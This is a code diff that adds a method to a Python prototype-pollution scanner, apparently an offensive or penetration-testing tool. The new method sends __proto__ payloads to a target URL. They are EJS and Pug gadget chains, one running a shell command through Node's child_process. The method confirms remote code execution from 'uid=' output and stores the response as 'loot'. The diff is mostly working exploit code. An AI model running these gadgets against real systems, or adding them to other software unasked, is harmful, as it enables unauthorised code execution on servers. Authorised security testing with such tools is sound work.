@@ -67,3 +67,36 @@ class PrototypePollutionScanner:
         except Exception: pass
 
         return findings
+
+    def escalate_rce(self, url, logger=None):
+        """Attempts to escalate PP to RCE via common Node.js gadgets"""
+        findings = []
+        if logger: logger(f"Prototype Expert: Attempting RCE escalation on {url}...", "INFO")
+        
+        # Gadgets for EJS, Pug, or Node child_process
+        gadgets = [
+            # EJS: client=true and escapeFunction
+            {"__proto__": {"client": True, "escapeFunction": "1; return process.mainModule.require('child_process').execSync('id');"}},
+            # Pug: self and compileDebug
+            {"__proto__": {"self": True, "compileDebug": True, "pretty": True}}
+        ]
+        
+        for g in gadgets:
+            try:
+                # We need to trigger a render after pollution (often happens on the same endpoint or a subsequent one)
+                resp = self.session.post(url, json=g, timeout=5)
+                # Check for RCE indicators in response
+                if any(k in resp.text for k in ["uid=", "gid=", "groups="]):
+                    findings.append({
+                        "title": "CRITICAL: Prototype Pollution to RCE Escalation",
+                        "description": f"Successfully escalated Prototype Pollution to RCE on {url} using EJS/Pug gadget chain.\nResponse contains system command output: {resp.text[:50]}",
+                        "severity": "critical",
+                        "tool_source": "prototype_expert",
+                        "url": url,
+                        "raw_loot": resp.text[:200]
+                    })
+                    if logger: logger(f"CRITICAL: Prototype Pollution RCE confirmed at {url}", "CRITICAL")
+                    break
+            except Exception:
+                pass
+        return findings
